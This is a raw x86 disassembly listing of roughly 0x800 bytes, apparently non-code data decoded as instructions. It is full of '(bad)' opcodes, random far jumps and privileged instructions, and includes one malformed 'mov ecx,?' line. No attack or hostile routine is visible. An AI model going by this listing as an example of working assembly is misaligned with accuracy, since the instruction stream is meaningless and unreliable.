  415b21:	adc    ch,BYTE PTR [ebp+0x4baacd3]
  415b27:	dec    esp
  415b28:	dec    edx
  415b29:	scas   eax,DWORD PTR es:[edi]
  415b2a:	js     0x415aad
  415b2c:	mov    ecx,0x5759ce9f
  415b31:	dec    dh
  415b33:	add    cx,WORD PTR [eax]
  415b36:	adc    edx,esi
  415b38:	xor    ebp,edi
  415b3a:	sbb    DWORD PTR [edi+edx*1+0xbe],ebp
  415b41:	add    al,al
  415b43:	push   ss
  415b44:	sbb    BYTE PTR [ebx-0x2a],0xdf
  415b48:	fistp  DWORD PTR [edi-0x239a6a81]
  415b4e:	ss repz push edi
  415b51:	shr    BYTE PTR [ebp-0x27],1
  415b54:	add    BYTE PTR [eax],al
  415b56:	hlt    
  415b57:	add    al,0x0
  415b59:	add    BYTE PTR [ebx],dl
  415b5b:	cmp    al,0x20
  415b5d:	es fs out dx,eax
  415b60:	mov    edx,0x320cae04
  415b65:	and    ebp,edi
  415b67:	mov    al,ds:0x5b3b292
  415b6c:	data16 add BYTE PTR [edi+0x664ea866],dl
  415b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b74:	push   ss
  415b75:	jbe    0x415b57
  415b77:	aad    0x58
  415b79:	cmp    bl,BYTE PTR [eax]
  415b7b:	hlt    
  415b7c:	pop    DWORD PTR [edx]
  415b7e:	ffreep st(4)
  415b80:	inc    edx
  415b81:	cmp    BYTE PTR [ecx],al
  415b83:	in     al,0x69
  415b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b86:	pop    edx
  415b87:	mov    ch,BYTE PTR [ebx]
  415b89:	jge    0x415bec
  415b8b:	imul   ecx,DWORD PTR [ebx+0x7d],0x22481dc9
  415b92:	mov    DWORD PTR [edx+0x57ca3c05],eax
  415b98:	sbb    eax,0x515369c3
  415b9d:	gs (bad) 
  415b9f:	(bad)  
  415ba0:	aaa    
  415ba1:	sub    al,0x96
  415ba3:	out    0xc9,al
  415ba5:	sbb    eax,esp
  415ba7:	xor    BYTE PTR [edx+0x2a],cl
  415baa:	mov    esp,0x18f5585e
  415baf:	dec    esi
  415bb0:	adc    DWORD PTR [edi],ebx
  415bb2:	or     al,0x23
  415bb4:	mov    bl,0xc1
  415bb6:	jbe    0x415bb7
  415bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bb9:	stc    
  415bba:	pushf  
  415bbb:	xchg   esi,eax
  415bbc:	aad    0x29
  415bbe:	sub    cl,dl
  415bc0:	xor    eax,0xe2ed33
  415bc5:	outs   dx,BYTE PTR ds:[esi]
  415bc6:	mov    ds:0x99cf843f,al
  415bcb:	pop    esp
  415bcc:	mov    WORD PTR [edx-0x60d3a950],gs
  415bd2:	enter  0xf7c,0xde
  415bd6:	cwde   
  415bd7:	adc    eax,0x26944c81
  415bdc:	popf   
  415bdd:	or     al,0xc3
  415bdf:	push   edx
  415be0:	call   0x8fd0:0xca1b273d
  415be7:	inc    esi
  415be8:	inc    ebp
  415be9:	mov    eax,ds:0x7670094c
  415bee:	sub    al,0xe7
  415bf0:	jns    0x415c08
  415bf2:	push   ds
  415bf3:	or     DWORD PTR [ecx],0xfffffffd
  415bf6:	icebp  
  415bf7:	add    DWORD PTR [ebp-0x10],0x5b
  415bfb:	inc    edi
  415bfc:	or     eax,0x7ec4ef5f
  415c01:	push   ss
  415c02:	std    
  415c03:	int    0xf9
  415c05:	cmp    ecx,eax
  415c07:	dec    ebx
  415c08:	test   al,0x13
  415c0a:	sar    ah,cl
  415c0c:	fsin   
  415c0e:	add    DWORD PTR [eax-0x23],0xffffff8d
  415c12:	ins    DWORD PTR es:[edi],dx
  415c13:	jg     0x415bad
  415c15:	daa    
  415c16:	cmp    DWORD PTR [edi+0x7e],edx
  415c19:	int3   
  415c1a:	sub    BYTE PTR [ebx+eiz*1-0x3b],ch
  415c1e:	xor    edi,DWORD PTR [edi+0x28699816]
  415c24:	sbb    dh,BYTE PTR [edx]
  415c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c27:	popf   
  415c28:	jbe    0x415c61
  415c2a:	mov    ch,0x20
  415c2c:	cmp    bh,BYTE PTR [eax]
  415c2e:	ins    DWORD PTR es:[edi],dx
  415c2f:	jmp    0xde91:0xd6c9e5cd
  415c36:	adc    ebp,eax
  415c38:	sahf   
  415c39:	or     ch,ah
  415c3b:	test   al,0xdb
  415c3d:	sbb    eax,0xdbd80d07
  415c42:	sar    ch,0xc1
  415c45:	push   eax
  415c46:	xor    ah,ch
  415c48:	lock ror ah,1
  415c4b:	clc    
  415c4c:	inc    ebx
  415c4d:	adc    eax,0xd4d28dc7
  415c52:	es mov edx,0xff9b8106
  415c58:	jg     0x415c82
  415c5a:	adc    BYTE PTR [ebp-0x51],dh
  415c5d:	or     al,0xe4
  415c5f:	mov    dh,0xf7
  415c61:	push   cs
  415c62:	shl    dh,0xf4
  415c65:	pushf  
  415c66:	inc    esi
  415c67:	and    DWORD PTR ds:0xdeebff27,ecx
  415c6d:	mov    ds:0x4d61a581,al
  415c72:	hlt    
  415c73:	jns    0x415c9d
  415c75:	test   BYTE PTR es:[esi+0x14],al
  415c79:	adc    eax,0x55e6eff9
  415c7e:	pop    eax
  415c7f:	out    0xf7,al
  415c81:	(bad)  
  415c82:	and    BYTE PTR [eax],bl
  415c84:	test   eax,0xc6141d7d
  415c89:	ja     0x415c57
  415c8b:	aaa    
  415c8c:	and    esi,edi
  415c8e:	inc    ecx
  415c8f:	sar    BYTE PTR [ecx+0x16cddd72],1
  415c95:	pusha  
  415c96:	adc    al,0x7d
  415c98:	lea    esp,[ecx]
  415c9a:	aas    
  415c9b:	ret    0x9236
  415c9e:	dec    eax
  415c9f:	xchg   ah,ch
  415ca1:	or     bh,BYTE PTR [ecx-0x5e]
  415ca4:	jno    0x415c55
  415ca6:	mov    bl,0xab
  415ca8:	das    
  415ca9:	out    0xc1,al
  415cab:	add    DWORD PTR [edx+0x4a858cc1],ebp
  415cb1:	sbb    bl,dh
  415cb3:	enter  0xf040,0xf9
  415cb7:	ror    BYTE PTR [esi-0x6b6defd7],cl
  415cbd:	sbb    DWORD PTR ss:[edi+0x68],edx
  415cc1:	int3   
  415cc2:	test   dh,dl
  415cc4:	push   esi
  415cc5:	mov    dh,0xe7
  415cc7:	add    ch,dh
  415cc9:	pop    esi
  415cca:	and    al,0x75
  415ccc:	in     eax,0xa5
  415cce:	(bad)  
  415ccf:	loopne 0x415d3a
  415cd1:	mov    eax,ds:0x7b26f9cf
  415cd6:	adc    edx,DWORD PTR [edi-0x15a2ddc6]
  415cdc:	dec    esp
  415cdd:	(bad)  
  415cde:	fistp  DWORD PTR [eax-0x65]
  415ce1:	xchg   ebx,eax
  415ce2:	loop   0x415d39
  415ce4:	imul   ebx,DWORD PTR [ebx+ecx*1+0x2c33fcea],0x26076883
  415cef:	mov    edx,ecx
  415cf1:	pop    ds
  415cf2:	icebp  
  415cf3:	sbb    BYTE PTR [edx+0x5f],0xca
  415cf7:	scas   ax,WORD PTR es:[edi]
  415cf9:	add    eax,DWORD PTR [eax+0x72]
  415cfc:	jp     0x415cca
  415cfe:	mov    eax,0xfd3ec0c7
  415d03:	ficom  WORD PTR [eax-0x39c39d67]
  415d09:	mov    ebx,0xcfbad241
  415d0e:	neg    ebp
  415d10:	mov    ss,WORD PTR [edx]
  415d12:	ja     0x415cf7
  415d14:	into   
  415d15:	cmp    ecx,esp
  415d17:	dec    edx
  415d18:	inc    ecx
  415d19:	push   esp
  415d1a:	int3   
  415d1b:	sahf   
  415d1c:	shl    BYTE PTR [esi-0xc664831],cl
  415d22:	sub    ax,0xad4
  415d26:	test   al,0x5e
  415d28:	lods   al,BYTE PTR ds:[esi]
  415d29:	mov    WORD PTR [edi],fs
  415d2b:	mov    ds:0x57275d9b,eax
  415d30:	mov    bh,0x5
  415d32:	dec    edi
  415d33:	rcr    DWORD PTR [edi+0x13],1
  415d36:	pop    ss
  415d37:	mov    bl,0x5
  415d39:	data16 jl 0x415cdc
  415d3c:	mov    cl,BYTE PTR [ecx+0x6d]
  415d3f:	or     al,0x2b
  415d41:	mov    esi,0x24d326ec
  415d46:	mov    esi,0x8630988b
  415d4b:	in     eax,0x4b
  415d4d:	dec    esp
  415d4e:	xor    al,0xa6
  415d50:	inc    eax
  415d51:	in     al,dx
  415d52:	jp     0x415d47
  415d54:	push   eax
  415d55:	add    ch,BYTE PTR [ebx+0x66181980]
  415d5b:	out    0x2c,eax
  415d5d:	jae    0x415d5c
  415d5f:	into   
  415d60:	push   0x863ac37d
  415d65:	cmc    
  415d66:	(bad)  
  415d67:	pop    edx
  415d68:	xor    edx,DWORD PTR [edx-0x7e]
  415d6b:	sub    al,bl
  415d6d:	ds adc eax,0x7f2aa512
  415d73:	repnz aam 0x81
  415d76:	pop    ebp
  415d77:	mov    edx,0x89c1a736
  415d7d:	jecxz  0x415df8
  415d7f:	mov    al,0xad
  415d81:	shl    DWORD PTR [edx],0x9b
  415d84:	aad    0x69
  415d86:	adc    DWORD PTR [ecx+0x30549216],edx
  415d8c:	(bad)  
  415d8d:	lods   eax,DWORD PTR ds:[esi]
  415d8e:	pop    ds
  415d8f:	popa   
  415d90:	jno    0x415dcc
  415d92:	rol    dl,0x88
  415d95:	inc    BYTE PTR [ecx-0x6d]
  415d98:	jo     0x415da4
  415d9a:	jbe    0x415d64
  415d9c:	ret    0x2c3d
  415d9f:	fwait
  415da0:	iret   
  415da1:	repz cmp ecx,edi
  415da4:	scas   al,BYTE PTR es:[edi]
  415da5:	mov    edi,0xa0863550
  415daa:	aaa    
  415dab:	jns    0x415dce
  415dad:	sub    eax,0x9b276636
  415db2:	pop    esp
  415db3:	pop    ecx
  415db4:	stos   BYTE PTR es:[edi],al
  415db5:	out    dx,al
  415db6:	push   ebp
  415db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db8:	sbb    DWORD PTR [esp+edi*4-0x24],0x2a2ffd7b
  415dc0:	mov    eax,ds:0xa035f322
  415dc5:	adc    BYTE PTR [edi+0x54],bl
  415dc8:	into   
  415dc9:	pop    ss
  415dca:	lahf   
  415dcb:	pop    edi
  415dcc:	daa    
  415dcd:	(bad)  [ecx]
  415dcf:	push   ebp
  415dd0:	sub    BYTE PTR [ebx],0x88
  415dd3:	add    BYTE PTR [ecx+0x6977d54d],dl
  415dd9:	(bad)  [eax-0x79]
  415ddc:	inc    edx
  415ddd:	and    ebx,eax
  415ddf:	dec    ecx
  415de0:	xchg   edx,eax
  415de1:	pop    ecx
  415de2:	jl     0x415e1d
  415de4:	iret   
  415de5:	retf   
  415de6:	mov    ebx,0xaf2b4c94
  415deb:	cmp    ch,0x1a
  415dee:	les    ebx,FWORD PTR [edx+0x7be91eb1]
  415df4:	mov    bh,0xd7
  415df6:	js     0x415e54
  415df8:	daa    
  415df9:	in     eax,0x3d
  415dfb:	jl     0x415def
  415dfd:	push   ebp
  415dfe:	scas   eax,DWORD PTR es:[edi]
  415dff:	stc    
  415e00:	repnz test al,0x7c
  415e03:	ret    
  415e04:	cdq    
  415e05:	and    eax,DWORD PTR [ecx]
  415e07:	xchg   BYTE PTR [esi+0x5],dl
  415e0a:	retf   0xa12b
  415e0d:	pop    es
  415e0e:	aas    
  415e0f:	test   eax,0xca073e7
  415e14:	sub    BYTE PTR [ebp-0x31],dl
  415e17:	cmp    al,0x54
  415e19:	push   edi
  415e1a:	cmp    al,0xa7
  415e1c:	and    ebx,ebp
  415e1e:	adc    eax,0xe5d42e66
  415e23:	nop
  415e24:	or     al,0xa8
  415e26:	mov    dl,BYTE PTR [edi+0x1551f57e]
  415e2c:	cmp    eax,0xc0e34e0f
  415e31:	mov    BYTE PTR [esi],bl
  415e33:	jbe    0x415e05
  415e35:	inc    eax
  415e36:	aas    
  415e37:	lahf   
  415e38:	push   cs
  415e39:	sbb    al,0xce
  415e3b:	pop    eax
  415e3c:	mov    ecx,?
  415e3e:	imul   edx,DWORD PTR [edx],0xffffffaa
  415e41:	js     0x415e0b
  415e43:	pop    es
  415e44:	sbb    DWORD PTR [eax],edi
  415e46:	or     eax,0x6320ae33
  415e4b:	inc    ebp
  415e4c:	(bad)  
  415e4d:	jmp    0xc73b:0xb9547d89
  415e54:	jo     0x415e7c
  415e56:	wbinvd 
  415e58:	jge    0x415ea5
  415e5a:	cdq    
  415e5b:	imul   eax,edx,0xffffffdc
  415e5e:	push   0x3ca9f0a0
  415e63:	and    eax,DWORD PTR [ebx+0x9]
  415e66:	gs inc esp
  415e68:	aaa    
  415e69:	mov    ch,0xd5
  415e6b:	xlat   BYTE PTR ds:[ebx]
  415e6c:	pop    esp
  415e6d:	mov    ah,0x88
  415e6f:	xchg   ebp,eax
  415e70:	cmp    al,0x76
  415e72:	imul   esi,DWORD PTR [ebx],0x4e
  415e75:	call   DWORD PTR [eax-0x8]
  415e78:	mov    al,gs:0xd16c4400
  415e7e:	push   0xba8a46c
  415e83:	adc    eax,0x37f01fc8
  415e88:	out    0x3,eax
  415e8a:	into   
  415e8b:	dec    esp
  415e8c:	rol    dl,cl
  415e8e:	pop    ss
  415e8f:	js     0x415e26
  415e91:	enter  0x8cd7,0xd
  415e95:	mov    esp,0x9be2640d
  415e9a:	test   BYTE PTR [eax-0x3b9dc20d],al
  415ea0:	adc    ebp,DWORD PTR [ecx]
  415ea2:	pop    es
  415ea3:	push   ebx
  415ea4:	pop    ebp
  415ea5:	sbb    ch,ch
  415ea7:	xor    BYTE PTR [ecx-0x46125f9],0xa4
  415eae:	cmovbe ebp,DWORD PTR [esi+0x277b34fd]
  415eb5:	inc    esi
  415eb6:	fs push ebx
  415eb8:	into   
  415eb9:	xor    eax,0xa8b75c5
  415ebe:	add    edi,0x7e
  415ec1:	pop    edx
  415ec2:	add    al,0x8d
  415ec4:	xor    eax,0xf7575433
  415ec9:	pusha  
  415eca:	in     eax,0x82
  415ecc:	outs   dx,BYTE PTR ds:[esi]
  415ecd:	inc    eax
  415ece:	pop    edi
  415ecf:	lahf   
  415ed0:	(bad)  
  415ed1:	and    al,0x3e
  415ed3:	adc    bh,0x1f
  415ed6:	test   BYTE PTR [esi+0x1c],dl
  415ed9:	push   ds
  415eda:	mov    esp,0xcbc98cd0
  415edf:	push   ebp
  415ee0:	adc    DWORD PTR [edx+0x71],esi
  415ee3:	cld    
  415ee4:	je     0x415eff
  415ee6:	or     BYTE PTR [esi],bl
  415ee8:	push   ss
  415ee9:	sub    al,0x3c
  415eeb:	enter  0x6e84,0xe0
  415eef:	nop
  415ef0:	cmp    eax,0x7
  415ef3:	cmp    BYTE PTR [edx],bl
  415ef5:	pop    ebp
  415ef6:	jg     0x415e7e
  415ef8:	mov    dh,0x89
  415efa:	out    dx,eax
  415efb:	mov    dl,0x14
  415efd:	xchg   ecx,eax
  415efe:	or     al,0x3a
  415f00:	mov    edx,0x3a56023a
  415f05:	mul    BYTE PTR [edi+0x25edc172]
  415f0b:	iret   
  415f0c:	int    0x40
  415f0e:	pop    esi
  415f0f:	and    al,0x1f
  415f11:	mov    ch,0x63
  415f13:	cmp    dh,bl
  415f15:	enter  0x1373,0xc0
  415f19:	cmp    bh,BYTE PTR [eax-0x79717818]
  415f1f:	mov    ds:0xadbf2c29,al
  415f24:	and    DWORD PTR [ecx-0x7a0e2256],0x32
  415f2b:	dec    ebp
  415f2c:	repz mov esp,0x6b83fc2b
  415f32:	jecxz  0x415f49
  415f34:	cs xchg ecx,eax
  415f36:	xlat   BYTE PTR ds:[ebx]
  415f37:	stos   BYTE PTR es:[edi],al
  415f38:	aaa    
  415f39:	dec    esi
  415f3a:	fcmovbe st,st(0)
  415f3c:	clc    
  415f3d:	es in  al,dx
  415f3f:	lods   al,BYTE PTR ds:[esi]
  415f40:	jge    0x415f6a
  415f42:	ret    
  415f43:	sbb    BYTE PTR [edx-0x6],ch
  415f46:	pop    esi
  415f47:	mov    ds:0x45d37a85,al
  415f4c:	dec    ebx
  415f4d:	enter  0xef0c,0x36
  415f51:	sub    al,0x4f
  415f53:	push   ds
  415f54:	das    
  415f55:	fisub  DWORD PTR [esi+ebp*4+0x4b]
  415f59:	jg     0x415fa6
  415f5b:	lods   eax,DWORD PTR ds:[esi]
  415f5c:	in     eax,0x92
  415f5e:	pop    ecx
  415f5f:	adc    cl,ah
  415f61:	fnstsw WORD PTR [ebx]
  415f63:	jmp    0x415f0a
  415f65:	iret   
  415f66:	adc    DWORD PTR [edi-0x408ff4b3],ecx
  415f6c:	dec    eax
  415f6d:	div    BYTE PTR [esi]
  415f6f:	retf   
  415f70:	out    0x62,al
  415f72:	mov    bh,0x2e
  415f74:	push   es
  415f75:	push   esi
  415f76:	cmp    al,0x99
  415f78:	lahf   
  415f79:	repnz inc edx
  415f7b:	cmp    al,0x5
  415f7d:	ins    BYTE PTR es:[edi],dx
  415f7e:	lods   ax,WORD PTR ds:[esi]
  415f80:	or     dh,bl
  415f82:	int    0x73
  415f84:	dec    ecx
  415f85:	cmc    
  415f86:	sbb    BYTE PTR [ebx-0x20],0x47
  415f8a:	sub    edi,ecx
  415f8c:	pop    gs
  415f8e:	shl    BYTE PTR [ebp+0x78139cac],1
  415f94:	jge    0x415f2e
  415f96:	call   0xc2467c36
  415f9b:	xchg   esp,eax
  415f9c:	push   cs
  415f9d:	mov    edx,0xa76799db
  415fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fa3:	jmp    0x415f88
  415fa5:	iret   
  415fa6:	retf   0x1183
  415fa9:	shr    esp,0x7f
  415fac:	dec    edi
  415fad:	cmc    
  415fae:	jmp    0x415f30
  415fb0:	out    dx,al
  415fb1:	test   al,0x4d
  415fb3:	sahf   
  415fb4:	dec    ecx
  415fb5:	call   0xdc321255
  415fba:	cmc    
  415fbb:	mov    eax,0xeb6b2f33
  415fc0:	jns    0x415f6d
  415fc2:	ret    
  415fc3:	xor    BYTE PTR [ebx],ch
  415fc5:	scas   al,BYTE PTR es:[edi]
  415fc6:	fcmove st,st(3)
  415fc8:	imul   esi,DWORD PTR [eax+0x180c5c45],0xffffffa7
  415fcf:	loopne 0x415fe7
  415fd1:	arpl   WORD PTR [ebp+0x1],si
  415fd4:	ds cld 
  415fd6:	test   DWORD PTR [ebx+0x63],edx
  415fd9:	cs stac 
  415fdd:	xor    esp,ebp
  415fdf:	data16 out 0xb4,al
  415fe2:	fnsave [edi+0x20]
  415fe5:	push   ebx
  415fe6:	and    eax,0x3eb95551
  415feb:	loop   0x415fd6
  415fed:	ds dec edi
  415fef:	test   edi,esi
  415ff1:	call   0x8ab4:0x7de6c37e
  415ff8:	test   eax,0x5d7b7d80
  415ffd:	loope  0x416043
  415fff:	inc    eax
  416000:	add    dl,BYTE PTR [ebp-0x1aae51f1]
  416006:	add    BYTE PTR [edx],bh
  416008:	xchg   edi,eax
  416009:	jle    0x8ecfb9a3
  41600f:	fbld   TBYTE PTR [eax+0x2d]
  416012:	(bad)
  416015:	xlat   BYTE PTR ds:[ebx]
  416016:	div    DWORD PTR [esi]
  416018:	repnz mov edi,0x2b4db0f4
  41601e:	in     ax,dx
  416020:	sub    eax,0x836904df
  416025:	inc    ebx
  416026:	xchg   ebp,eax
  416027:	or     ebp,DWORD PTR [ecx-0x49]
  41602a:	cmp    al,0xf2
  41602c:	repz stc 
  41602e:	jmp    FWORD PTR [edi-0x74223dcd]
  416034:	cmovns ebx,DWORD PTR [edx+0x22]
  416038:	xor    eax,0x8a933d3a
  41603d:	fiadd  DWORD PTR [esi+0x1e3bd516]
  416043:	(bad)  
  416044:	or     al,0xde
  416046:	loope  0x4160c2
  416048:	les    edi,FWORD PTR [eax-0x72dee8d6]
  41604e:	add    BYTE PTR [eax],al
  416050:	add    BYTE PTR [eax],al
  416052:	cmp    dh,BYTE PTR [ebp+0x3c]
  416055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416056:	jg     0x416047
  416058:	mov    edx,0xd72f5cfd
  41605d:	jae    0x416049
  41605f:	inc    eax
  416060:	jp     0x4160ce
  416062:	popa   
  416063:	fiadd  WORD PTR [eax]
  416065:	add    ah,dh
  416067:	add    al,0x0
  416069:	add    BYTE PTR [esi+0x39],dl
  41606c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41606d:	repnz or al,0x9b
  416070:	test   BYTE PTR [eax+0x7395fb58],al
  416076:	add    al,0x20
  416078:	ins    DWORD PTR es:[edi],dx
  416079:	xchg   DWORD PTR [ebp+edi*1+0x42bd5865],eax
  416080:	push   ds
  416081:	or     dl,bl
  416083:	ret    0x3f00
  416086:	push   0xffffffa5
  416088:	and    eax,0x1d1070b
  41608d:	sbb    bl,al
  41608f:	jg     0x4160fe
  416091:	ins    BYTE PTR es:[edi],dx
  416092:	xchg   edi,eax
  416093:	push   ecx
  416094:	(bad)  [ebx]
  416096:	(bad)  
  416097:	mov    eax,0x6a7bc976
  41609c:	add    al,0x95
  41609e:	mov    bh,dh
  4160a0:	dec    ebp
  4160a1:	push   edi
  4160a2:	and    eax,ebx
  4160a4:	arpl   WORD PTR [esi-0x5b055f20],sp
  4160aa:	sbb    dh,BYTE PTR [ebx+0x7b]
  4160ad:	mov    DWORD PTR [esi+eax*1-0x63],ebx
  4160b1:	std    
  4160b2:	mov    DWORD PTR [edx],edx
  4160b4:	sbb    DWORD PTR [ebx*8-0x383e0ccf],0xffffffeb
  4160bc:	hlt    
  4160bd:	retf   0x64e5
  4160c0:	mov    WORD PTR [edx+0x76],es
  4160c3:	jmp    FWORD PTR [edi+0x3b]
  4160c6:	leave  
  4160c7:	mov    BYTE PTR [esi],dl
  4160c9:	mov    esp,0xb6d87bcf
  4160ce:	sbb    al,0xea
  4160d0:	push   es
  4160d1:	lahf   
  4160d2:	addr16 enter 0xac91,0x49
  4160d7:	inc    edx
  4160d8:	pop    ss
  4160d9:	sbb    BYTE PTR [ecx],0x67
  4160dc:	fsubr  QWORD PTR [eax]
  4160de:	xchg   edx,eax
  4160df:	fdivr  QWORD PTR cs:[ebx+0x40a8ee39]
  4160e6:	nop
  4160e7:	inc    ecx
  4160e8:	mov    dh,0xe7
  4160ea:	sti    
  4160eb:	pop    ecx
  4160ec:	in     al,0xfe
  4160ee:	out    dx,eax
  4160ef:	shl    DWORD PTR [ebx-0x21],cl
  4160f2:	dec    edx
  4160f3:	push   cs
  4160f4:	loopne 0x4160d0
  4160f6:	push   0xffffffa6
  4160f8:	inc    esi
  4160f9:	sub    eax,0x24bc752c
  4160fe:	imul   edx,DWORD PTR [esi-0x4e],0xd469f861
  416105:	call   0xa8e:0xbb1c776a
  41610c:	std    
  41610d:	mov    ds:0x807e02e3,al
  416112:	adc    DWORD PTR [edi+0x70],ebp
  416115:	pop    ecx
  416116:	cs or  al,0xe7
  416119:	fs stos BYTE PTR es:[edi],al
  41611b:	aaa    
  41611c:	mov    ebp,0xd2c24a99
  416121:	jmp    0xc8fb:0x7df58157
  416128:	and    DWORD PTR [edi],esi
  41612a:	or     BYTE PTR [ebx+0x90cff6b],al
  416130:	jge    0x416101
  416132:	adc    DWORD PTR [eax+eax*8],0x6c
  416136:	ror    BYTE PTR [ebx+eiz*4+0xe5d1549],1
  41613d:	stc    
  41613e:	sti    
  41613f:	aad    0x51
  416141:	es lahf 
  416143:	mov    ecx,0x77603d09
  416148:	dec    edx
  416149:	into   
  41614a:	xchg   esi,eax
  41614b:	add    al,0xb
  41614d:	add    eax,0xb0e5ce2e
  416152:	mov    esi,0x2a28d261
  416157:	sbb    bl,BYTE PTR [ecx]
  416159:	pop    ebp
  41615a:	add    edi,DWORD PTR [edx-0x42d0f005]
  416160:	jne    0x4161d1
  416162:	push   ecx
  416163:	imul   esp,DWORD PTR [edx],0xffffff91
  416166:	or     al,0x1a
  416168:	iret   
  416169:	pop    ebx
  41616a:	dec    eax
  41616b:	or     edx,esi
  41616d:	sbb    al,0x38
  41616f:	icebp  
  416170:	and    al,0x39
  416172:	xlat   BYTE PTR ds:[ebx]
  416173:	test   DWORD PTR [eax],eax
  416175:	jmp    0x4161e5
  416177:	xchg   edx,eax
  416178:	or     bh,BYTE PTR [ebx]
  41617a:	jl     0x416117
  41617c:	jl     0x41616f
  41617e:	mov    ecx,0x8ad4461a
  416183:	clc    
  416184:	retf   
  416185:	lock mov ebp,DWORD PTR [ebp+0x58097d78]
  41618c:	sub    eax,0xa5b35360
  416191:	and    al,BYTE PTR [esi-0x6f5a546b]
  416197:	stc    
  416198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416199:	mov    ebx,0x81d48d52
  41619e:	pop    eax
  41619f:	lods   eax,DWORD PTR ds:[esi]
  4161a0:	inc    ecx
  4161a1:	sar    ecx,0xd
  4161a4:	pop    esi
  4161a5:	cmp    eax,0x1b9de70d
  4161aa:	pop    ecx
  4161ab:	jl     0x4161c3
  4161ad:	mov    ebp,ebx
  4161af:	addr16 call 0xbb5c:0x8b4bde03
  4161b7:	(bad)  
  4161ba:	xor    al,0x8f
  4161bc:	pop    edx
  4161bd:	pop    ebx
  4161be:	jecxz  0x4161a7
  4161c0:	sub    al,cl
  4161c2:	xor    BYTE PTR [esi],dl
  4161c4:	and    ebp,DWORD PTR [esi-0x40bdc89b]
  4161ca:	in     eax,0xef
  4161cc:	and    BYTE PTR [ecx-0x69],bl
  4161cf:	mov    ebp,0xadfbc354
  4161d4:	nop
  4161d5:	clc    
  4161d6:	or     al,0x9f
  4161d8:	les    esp,FWORD PTR [eax+0x34]
  4161db:	pop    esp
  4161dc:	sbb    DWORD PTR [ecx],edx
  4161de:	jecxz  0x416204
  4161e0:	xchg   edi,eax
  4161e1:	xlat   BYTE PTR ds:[ebx]
  4161e2:	rcl    BYTE PTR [edx],1
  4161e4:	stc    
  4161e5:	out    0xc0,eax
  4161e7:	inc    eax
  4161e8:	rcr    DWORD PTR [eax],cl
  4161ea:	shl    DWORD PTR [edx-0x74],1
  4161ed:	loope  0x4161b6
  4161ef:	loope  0x41626c
  4161f1:	shr    eax,cl
  4161f3:	call   0x9f98:0x9e547cc1
  4161fa:	mov    eax,0x592cdd05
  4161ff:	push   eax
  416200:	add    eax,0x35b00c5e
  416205:	test   al,0x9b
  416207:	fimul  DWORD PTR [ebx-0xc]
  41620a:	fiadd  DWORD PTR [eax-0x76]
  41620d:	call   0xe375acd5
  416212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416213:	call   0x7221:0x74dcd10
  41621a:	cmp    bl,BYTE PTR [ecx]
  41621c:	stc    
  41621d:	inc    esi
  41621e:	es ins DWORD PTR es:[edi],dx
  416220:	clc    
  416221:	jl     0x4161a7
  416223:	test   DWORD PTR [edi],0x4abb17f0
  416229:	ja     0x4161ab
  41622b:	mov    DWORD PTR [eax+0x34],esp
  41622e:	jmp    0x86a7:0x1dd09179
  416235:	push   ebp
  416236:	mov    eax,ss:0x2685a729
  41623c:	dec    edi
  41623d:	sar    al,1
  41623f:	sbb    eax,0x4fc00861
  416244:	jmp    0x9b82:0x4d65b44c
  41624b:	xor    al,BYTE PTR [edx+edx*1-0x5c]
  41624f:	xchg   ecx,eax
  416250:	pop    ebp
  416251:	ss iret 
  416253:	inc    edx
  416254:	aaa    
  416255:	cmp    dh,bh
  416257:	xor    ebx,DWORD PTR [edx-0x27b8b5e]
  41625d:	shl    DWORD PTR [esp+eax*1],0x7b
  416261:	mov    WORD PTR [ecx+ebp*4],ss
  416264:	push   edi
  416265:	pusha  
  416266:	jp     0x4162bb
  416268:	and    DWORD PTR [edx],0x1c
  41626b:	popf   
  41626c:	ret    0xc1f1
  41626f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416270:	inc    ebp
  416271:	mov    esp,0x5ac7b7bb
  416276:	push   esp
  416277:	add    al,0x91
  416279:	jmp    0x4162eb
  41627b:	jp     0x4162c5
  41627d:	xchg   edi,eax
  41627e:	xor    al,0xd6
  416280:	into   
  416281:	test   al,0x8e
  416283:	or     BYTE PTR [edx],ch
  416285:	dec    ebx
  416286:	cmc    
  416287:	loopne 0x41620a
  416289:	push   ecx
  41628a:	(bad)  
  41628b:	je     0x416213
  41628d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41628e:	nop
  41628f:	cmp    DWORD PTR [ebx],ebp
  416291:	(bad)  
  416292:	jl     0x416308
  416294:	xchg   esp,esp
  416296:	cmp    BYTE PTR [eax+0x6a],al
  416299:	outs   dx,DWORD PTR ds:[esi]
  41629a:	repz clc 
  41629c:	or     eax,0x9d3d5be2
  4162a1:	dec    ecx
  4162a2:	out    dx,al
  4162a3:	sbb    BYTE PTR [edi+edx*1-0x71c6ccbe],ch
  4162aa:	mov    esp,0x7acde5e
  4162af:	lahf   
  4162b0:	pop    ds
  4162b1:	out    dx,al
  4162b2:	add    eax,0x14c86888
  4162b7:	stc    
  4162b8:	inc    edx
  4162b9:	addr16 push ebx
  4162bb:	push   0x3
  4162bd:	int3   
  4162be:	jno    0x416314
  4162c0:	int    0x56
  4162c2:	pop    edi
  4162c3:	dec    esi
  4162c4:	jg     0x416293
  4162c6:	dec    ecx
  4162c7:	mov    al,0x6b
  4162c9:	inc    esp
  4162ca:	adc    BYTE PTR [edi],al
  4162cc:	fs pop ebp
  4162ce:	adc    DWORD PTR [ebp+0x17],edi
  4162d1:	test   al,0xdb
  4162d3:	push   ebx
  4162d4:	loop   0x4162d0
  4162d6:	sub    eax,0xf354b33e
  4162db:	and    al,0x1b
  4162dd:	addr16 inc ebp
  4162df:	push   cs
  4162e0:	outs   dx,DWORD PTR ds:[esi]
  4162e1:	pop    eax
  4162e2:	arpl   WORD PTR [ebx+0x227fd761],cx
  4162e8:	adc    dh,al
  4162ea:	or     al,BYTE PTR [esi-0x2177ee5d]
